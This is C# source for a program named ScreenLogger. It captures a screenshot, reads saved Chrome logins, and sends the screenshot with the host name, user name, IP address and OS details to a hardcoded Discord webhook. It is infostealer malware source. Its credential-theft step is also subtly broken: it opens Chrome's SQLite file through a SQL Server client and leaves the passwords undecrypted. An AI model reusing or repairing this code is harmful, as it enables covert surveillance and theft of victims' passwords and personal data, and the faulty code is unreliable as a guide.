using Microsoft.Data.Sqlite;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;
using SQLitePCL;
using System.Data.SqlClient;

namespace ScreenLogger
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Take screenshot
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

            // Save screenshot to memory stream
            MemoryStream stream = new MemoryStream();
            screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);

            //get chrome passwords (gpt)
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string chromePath = Path.Combine(localAppData, @"Google\Chrome\User Data\Default\Login Data");
            using (SqlConnection connection = new SqlConnection("Data Source=" + chromePath))
            using (SqlCommand cmd = new SqlCommand("SELECT origin_url, username_value, password_value FROM logins", connection))
            {
                Console.WriteLine(connection);
                connection.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        Console.WriteLine("URL: " + reader.GetString(0));
                        Console.WriteLine("Username: " + reader.GetString(1));
                        Console.WriteLine("Password: " + reader.GetString(2));
                    }
                }
            }
            

            // Send screenshot to Discord webhook
            byte[] imageBytes = stream.ToArray();
            string webhookUrl = "https://discord.com/api/webhooks/1071565067109277706/Aq1uuQZJrQkOC6mZUGjr0lnQfr3qN2Dt6zRNELyaqqkMrbKpLYv9DRQ8YDwxiGA2DU-L";
            HttpClient client = new HttpClient();
            MultipartFormDataContent formDataContent = new MultipartFormDataContent
            {
                { new StringContent(
                    "Screenshot from Device Name: " + Dns.GetHostName() 
                    + "\nUser Profile Name: " + Environment.UserName
                    + $"\nIP Address (IPV4_MAPPED_IPV6={Dns.GetHostEntry(Dns.GetHostName()).AddressList.First().IsIPv4MappedToIPv6}): " + Dns.GetHostEntry(Dns.GetHostName()).AddressList.First()
                    + "\nOS: " + Environment.OSVersion.ToString()
                    + "\nOSVersion: " + Environment.OSVersion.Platform.ToString()
                    + "\n64bitOS: " + Environment.Is64BitOperatingSystem
                    +"\n---Passwords---"
                    + "\nGoogle Chrome:"
                    ,Encoding.UTF8),"\"content\"" },
                { new ByteArrayContent(imageBytes, 0, imageBytes.Length), ".png", "screenshot.png" },
            };
            client.PostAsync(webhookUrl, formDataContent).Wait();
            client.Dispose();
        }
    }
}
